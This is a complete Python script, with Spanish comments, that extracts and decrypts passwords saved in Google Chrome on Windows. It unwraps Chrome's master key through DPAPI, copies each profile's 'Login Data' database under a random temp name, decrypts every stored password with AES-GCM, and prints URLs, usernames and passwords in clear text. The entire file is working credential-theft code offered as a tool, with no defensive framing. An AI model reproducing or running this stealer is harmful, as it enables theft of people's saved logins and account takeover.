# Coded by Alejandro G.D

import os
import shutil 
import json, base64, random
import shutil, sqlite3, string
from Crypto.Cipher import AES
import win32crypt

# Ruta de la base de datos de contraseñas de Chrome
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
TEMP_PATH = os.getenv('temp')

#Generar caracteres alfanumericos de 6 caracteres de longitud
def random_name():
    rnd_name = string.ascii_letters + string.digits 
    return ''.join(random.choice(rnd_name) for _ in range(6))

# Obteniendo clave para el descifrado
def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""

def extractor_pass(profiles_path):
    try:
        temp_path = os.getenv('temp') + "\\" + random_name()
        shutil.copy2(profiles_path, temp_path)
        
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        
        for datas in cursor.fetchall():
            url = datas[0]
            username = datas[1]
            password = decrypt(datas[2], get_secret_key())

            if password != "":
                print (f"\n URL: {url}\n USERNAME: {username}\n PASSWORD: {password}")

        conn.close()
        os.remove(temp_path)

    except Exception as ex:
        print (str(ex))

def main():
    for dirs in os.listdir(CHROME_PATH):
        dirs_path = os.path.join(CHROME_PATH, dirs)
        
        #print (dirs_path)
        # Verificar y filtrar solo las carpetas Profile
        if os.path.isdir(dirs_path) and dirs.startswith('Profile'):
            # Obteniendo todos los ficheros "Login Data"
            for dirs_2 in os.listdir(dirs_path):
                if dirs_2 == "Login Data":
                    full_path = os.path.join(dirs_path, dirs_2)
                    extractor_pass(full_path)

if __name__ == "__main__":
    main()
